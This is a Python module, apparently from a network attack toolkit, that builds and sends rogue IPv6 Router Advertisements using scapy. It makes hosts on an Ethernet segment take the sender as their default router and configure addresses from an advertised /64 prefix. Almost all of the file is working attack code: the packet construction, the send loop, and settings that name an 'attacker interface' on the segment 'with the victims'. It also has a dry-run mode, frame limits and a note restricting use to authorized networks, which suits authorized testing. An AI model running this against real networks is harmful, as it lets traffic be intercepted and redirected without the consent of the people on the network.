"""Rogue router advertisement: announce this host as an IPv6 default router with a chosen prefix.

IPv6 hosts learn their default router and their prefixes from Router Advertisements (RFC 4861).
Those messages are not authenticated on a plain Ethernet segment. A host that sends an RA with a
router lifetime above zero makes listening hosts add it as a default router, and, with the autonomous
flag set, configure a SLAAC address from the advertised prefix.

This module sends Router Advertisements from the operator's MAC, to the all-nodes multicast address,
with the hop limit 255 that RFC 4861 requires. The effect to measure is whether a listening host adds
this host as its default router and configures an address in the advertised prefix.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_RA,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

MAX_FRAMES = 100
MAX_ROUTER_LIFETIME = 65535
ALL_NODES_MAC = "33:33:00:00:00:01"
ALL_NODES_IP = "ff02::1"


def link_local_from_mac(mac: str) -> str:
    """The EUI-64 link-local address for a MAC address (fe80::/64, universal bit flipped)."""
    octets = [int(b, 16) for b in normalize_unicast_mac(mac).split(":")]
    octets[0] ^= 0x02
    eui64 = octets[:3] + [0xFF, 0xFE] + octets[3:]
    groups = [(eui64[i] << 8) | eui64[i + 1] for i in range(0, 8, 2)]
    return str(ipaddress.IPv6Address(("fe80" + ":0" * 3 + ":" + ":".join(f"{g:x}" for g in groups))))


def validate_prefix(prefix: str) -> ipaddress.IPv6Network:
    try:
        network = ipaddress.IPv6Network(prefix, strict=False)
    except ValueError as exc:
        raise ValueError(f"Prefix {prefix!r} is not an IPv6 network.") from exc
    if network.prefixlen != 64:
        raise ValueError("Advertised prefix must be a /64 for SLAAC.")
    return network


@dataclass(frozen=True)
class RogueRouterAdvertisementConfig:
    iface: str                          # attacker interface, on the segment with the victims
    source_mac: str                     # the advertised router's MAC (required)
    prefix: str = "2001:db8:bad::/64"   # the /64 advertised for SLAAC
    router_lifetime: int = 1800         # seconds this host is a default router; 0 would withdraw it
    frames: int = 3                     # RAs sent, to keep the router entry fresh
    dry_run: bool = False               # build RAs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        validate_prefix(self.prefix)
        if not 1 <= self.router_lifetime <= MAX_ROUTER_LIFETIME:
            raise ValueError(f"Router lifetime must be between 1 and {MAX_ROUTER_LIFETIME} seconds.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class RogueRouterAdvertisementStats:
    frames: int = 0
    status: str = ""


def build_advertisement(config: RogueRouterAdvertisementConfig) -> Packet:
    """One Router Advertisement with source link-layer address and one SLAAC prefix option."""
    network = validate_prefix(config.prefix)
    source = normalize_unicast_mac(config.source_mac)
    return (
        Ether(src=source, dst=ALL_NODES_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)
        / ICMPv6ND_RA(routerlifetime=config.router_lifetime, reachabletime=0, retranstimer=0)
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
        / ICMPv6NDOptPrefixInfo(
            prefixlen=64, L=1, A=1, validlifetime=86400, preferredlifetime=14400,
            prefix=str(network.network_address),
        )
    )


def run_rogue_router_advertisement(
    config: RogueRouterAdvertisementConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RogueRouterAdvertisementStats], None],
    send: Callable[..., Any] | None = None,
) -> RogueRouterAdvertisementStats:
    """Send `frames` Router Advertisements, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = RogueRouterAdvertisementStats(
            status=(
                f"Dry run: would send {config.frames} Router Advertisement(s) for {config.prefix} with router "
                f"lifetime {config.router_lifetime}s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RogueRouterAdvertisementStats()
    frame = build_advertisement(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
